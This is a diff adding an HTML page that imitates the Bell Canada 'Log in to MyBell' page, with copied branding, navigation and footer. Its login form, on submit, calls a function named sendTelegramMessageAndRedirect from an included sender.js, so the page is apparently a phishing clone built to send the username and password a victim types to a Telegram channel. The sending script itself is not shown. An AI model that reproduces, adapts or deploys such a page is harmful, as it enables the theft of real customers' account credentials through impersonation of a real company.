@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="style2.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="./Bell-asset/bell-favicon.svg" type="image/x-icon"> 
+    <script src="./script.js" defer></script>
+    <script src="./sender.js" defer></script>
+    <title>Log in to MyBell</title>
+  </head>
+  <body>
+    <nav class="first-nav">
+      <div class="container">
+        <ul class="menu__wrapper">
+          <li class="menu__link"><span href="">PERSONAL</span></li>
+          <li class="menu__link"><span href="">BUSINESS &#9660</span></li>
+          <li class="menu__link"><span href="">BELL FOR BETTER</span></li>
+          </ul>
+          <ul class="menu__wrapper">
+          <li class="menu__link"><span href="">FIND A STORE &#9660</span></li>
+          <li class="menu__link"><span href="">ACCESSIBILITY</span></li>
+          <li class="menu__link"><span href="">ON | FR</span></li>
+        </ul>
+      </div>
+    </nav>
+
+    <nav class="second-nav">
+      <div class="container">
+        <div class="logo__wrapper">
+          <img src="./Bell-asset/bell logo.png" class="logo" />
+        </div>
+        <ul class="menu__wrapper">
+          <li class="menu__link">Mobility</li>
+          <li class="menu__link">Internet</li>
+          <li class="menu__link">TV</li>
+          <li class="menu__link">Smart Home</li>
+          <li class="menu__link">Home phone</li>
+          <li class="menu__link">Bundles</li>
+          <li class="menu__link">Promotion</li>
+          <li class="menu__link">Support</li>
+        </ul>
+        
+        <!-- /////////////////////////////// Mobile navigation /////////////////////-->
+        <div class="mobile-nav__wrapper">
+          <nav class="mobile-nav">
+            <a href="" class="home">Home</a>
+            <!-- mobile inner menu starts here!  -->
+
+            <div class="mobile-menu__wrapper">
+              <div class="mobile-menu-log__wrapper">
+                <div class="mobile-mneu-control-nav">
+                  <button class="btn btn--reg" type="button">Log in / Register</button>
+                  <i class="icon fa-solid fa-cart-shopping"></i>
+                </div>
+                <div class="mobile-menu">
+                  <ul class="mobile-menu__log">
+                    <li class="mobile-menu__link caret">Mobility</li>
+                    <li class="mobile-menu__link caret">Internet</li>
+                    <li class="mobile-menu__link caret">TV</li>
+                    <li class="mobile-menu__link caret">Smart Home</li>
+                    <li class="mobile-menu__link caret">Home phone</li>
+                    <li class="mobile-menu__link caret">Bundles</li>
+                    <li class="mobile-menu__link">Promotion</li>
+                    <li class="mobile-menu__link">Support</li>
+                  </ul>
+                  <ul class="mobile-menu__log">
+                    <li class="mobile-menu__link"><span href="">PERSONAL</span></li>
+                    <li class="mobile-menu__link"><span href="">BUSINESS &#9660</span></li>
+                    <li class="mobile-menu__link"><span href="">BELL FOR BETTER</span></li>
+                    <li class="mobile-menu__link"><span href="">FIND A STORE &#9660</span></li>
+                    <li class="mobile-menu__link"><span href="">ACCESSIBILITY</span></li>
+                    <li class="mobile-menu__link"><span href="">ON | FR</span></li>
+                  </ul>
+                </div>
+                <!-- ends here! -->
+
+              </div>
+            </div>
+            <div class="mobile-nav-control__wrapper">
+              <ul class="mobile-nav-control">
+                <li><i class="fas fa-search search"></i></li>
+                <li><i class="icon fa-solid fa-cart-shopping mobile-fa-cart-shopping"></i></li>
+                <li>
+                  <div id="toggle-menu" class="toggle-menu">
+                    <i class="fa-solid fa-bars"></i>
+                    <i class="fa-solid fa-xmark opacity"></i>
+                  </div>
+                </li>
+              </ul>
+            </div>
+          </nav>
+        </div>
+        <!-- /////////////////////////////// Mobile navigation stops here /////////////////////-->
+        <div class="nav-control">
+          <i class="fas fa-search search"></i>
+          <i class="icon fa-solid fa-cart-shopping"></i>
+          <button class="btn btn--reg" type="button">Log in / Register</button>
+        </div>
+      </div>
+    </nav>
+
+    <!-- ///////////////////// maiin structure start here! ////////////////// -->
+    <main>
+      <div class="container">
+        <h1 class="title">Self Serve with MyBell</h1>
+        <section>
+          <div class="section__wrapper-grid">
+            <div class="grid__item">
+              <div class="col">
+                <form action="" id="form" class="form" onsubmit="sendTelegramMessageAndRedirect(); return false; return false;">
+                  <h2 class="sub__title">Log in</h2>
+                  <div class="input__wrapper">
+                    <label for="email">Username</label>
+                    <input type="email" id="email" class="email" required />
+                  </div>
+                  <label for="password">Password</label>
+                  <div class="input__wrapper">
+                    <div class="input">
+                      <input
+                      type="password"
+                      id="password"
+                        class="password"
+                        required
+                        />
+                        <button class="show-password">SHOW</button>
+                    </div>
+                  </div>
+                  <div href="" class="forgot-password">
+                    <input type="checkbox" name="checkbox" id="" class="checkbox">
+                    <span>Remember my usernsme</span>
+                  </div>
+                  <button class="btn submit-btn" type="submit">Log in</button>
+                </form>
+              </div>
+              <div class="col"></div>
+            </div>
+            <div class="grid__item">
+              <div class="col">
+                <h2 class="sub__title">Register</h2>
+                <h3 class="inner__title">MyBell helps you do more</h3>
+                <ul class="register__list">
+                  <li class="register__item">
+                    View your account and make payments
+                  </li>
+                  <li class="register__item">
+                    Get an explanation of your changes
+                  </li>
+                  <li class="register__item">Check your usage</li>
+                  <li class="register__item">Review ypur plan or features</li>
+                  <li class="register__item">
+                    SIgn up for paperless billing with e-bill
+                  </li>
+                </ul>
+                <span class="register__span">
+                  See the full list of MyBell's features
+                </span>
+                <button type="button" class="btn btn-reg__main">Register now</button>
+              </div>
+              <div class="col">
+                <img src="./Bell-asset/login_MyBell female.jpg" alt="" class="female-persona"/>
+              </div>
+            </div>
+          </div>
+        </section>
+        <section>
+          <div class="section__container-flex">
+            <div class="flex__item">
+              <img src="./Bell-asset/login_MyBell male.jpg" alt="" class="male-persona"/>
+            </div>
+            <div class="flex__item">
+              <img
+                src="./Bell-asset/bell-banner.png"
+                alt=""
+                class="bell__image"
+              />
+              <h2 class="flex__item-title">
+                Manage your service with the MyBell app.
+              </h2>
+              <p>
+                view and pay bills, monitor usage, update your service and
+                add-ons and more.
+                <br />
+                On a computer? Scan the OR code with your smartphone camera to
+                go to your app store.
+              </p>
+              <span>Learn more</span>
+              <div class="store-image__wrapper">
+                <img src="./Bell-asset/applestore.png" alt="" class="store-image"/>
+                <img src="./Bell-asset/google-playstore.png" alt="" class="store-image"/>
+              </div>
+            </div>
+            <div class="flex__item">
+              <img
+                src="./Bell-asset/Bell-LoginPageQRCode.jpg"
+                alt=""
+                class="qrcode"
+              />
+            </div>
+          </div>
+        </section>
+      </div>
+    </main>
+    <!-- ///////////////////// maiin structure ends here! ////////////////// -->
+    <footer>
+      <div class="container">
+        <div class="footer__wrapper">
+          <div class="footer__item accordion">
+            <div class="accordion-control">
+              <h4 class="accordion-title">About us</h4>
+              <i class="fa-solid fa-chevron-up chevron-up "></i>
+            </div>
+            <ul class="accordion-list inner-list">
+              <li class="accordion__footer-list">About Bell Canada</li>
+              <li class="accordion__footer-list">Bell Let's Talk</li>
+              <li class="accordion__footer-list">Bell for Better</li>
+              <li class="accordion__footer-list">Jobs @ Bell</li>
+              <li class="accordion__footer-list">Bell Media</li>
+            </ul>
+          </div>
+          <div class="footer__item accordion">
+            <div class="accordion-control">
+              <h4 class="accordion-title">Customer resources</h4>
+              <i class="fa-solid fa-chevron-up chevron-up"></i>
+            </div>
+            <div class="footer__item-col">
+              <div class="accordion-list item-col">
+                <ul class="inner-list">
+                  <li class="accordion__footer-list">Return policy</li>
+                  <li class="accordion__footer-list">Privacy</li>
+                  <li class="accordion__footer-list">Security</li>
+                  <li class="accordion__footer-list">Legal and regulatory</li>
+                </ul>
+             
+                <ul class="inner-list">
+                  <li class="accordion__footer-list">Internet Code</li>
+                  <li class="accordion__footer-list">Wireless Code</li>
+                  <li class="accordion__footer-list">Community forum</li>
+                  <li class="accordion__footer-list">Track my order</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <div class="footer__item">
+            <div class="accordion-control no-borderz">
+              <h4 class="accordion-title">Get in touch</h4>
+            </div>
+            <ul class="about-us__wrapper">
+              <li class="accordion__footer-list about-us">
+                <div class="about-us-icon">
+                  <i class="fa-solid fa-headset"></i>
+                </div>
+                <span>Contact us</span>
+              </li>
+              <li class="accordion__footer-list about-us">
+                <div class="about-us-icon">
+                  <i class="fa-solid fa-location-dot"></i>
+                </div>
+                <span>Find a store</span>
+              </li>
+              <li class="accordion__footer-list about-us">
+                <div class="about-us-icon">
+                  <i class="fa-solid fa-calendar-days"></i>
+                </div>
+                <span>Book am appointment</span>
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div class="footer__wrapper">
+          <div class="social-icon__wrapper">
+            <button type="button" class="btn btn--white">Accessibility centre</button>
+            <div class="social-icon__container social-icon">
+              <i class="fa-brands fa-facebook-f social-icon"></i>
+              <i class="fa-brands fa-x-twitter social-icon"></i>
+              <i class="fa-brands fa-square-instagram social-icon"></i>
+              <i class="fa-brands fa-linkedin-in social-icon"></i>
+              <i class="fa-brands fa-youtube social-icon"></i>
+            </div>
+          </div>
+        </div>
+        <div class="footer__wrapper">
+          <div class="last-footer">
+            <p>© Bell Canada All rigth reserved</p>
+            <p>Site feedback</p>
+            <p>Site map</p>
+          </div>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
